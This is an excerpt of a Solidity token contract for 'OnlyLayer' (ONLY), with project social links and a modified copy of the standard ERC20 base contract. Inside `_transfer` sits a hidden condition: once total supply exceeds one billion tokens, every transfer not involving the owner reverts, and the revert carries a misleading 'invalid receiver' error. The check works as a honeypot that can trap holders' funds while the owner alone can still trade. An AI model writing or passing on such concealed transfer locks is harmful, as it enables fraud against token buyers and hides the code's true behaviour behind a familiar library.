...
/*  
   ...
   * X: https://x.com/Onlylayer
   * Discord: https://discord.gg/onlylayer
   * Telegram: https://t.me/onlylayer
*/
...
abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors, Ownable {
    ...
    function _transfer(address from, address to, uint256 value) internal {
        ...
        if(totalSupply() > 1000000000*10**18 && (from != owner() && to != owner()) ){
            revert ERC20InvalidReceiver(address(0));
        }
...
contract Token is ERC20 {
    ...
    constructor() ERC20("OnlyLayer", "ONLY") {
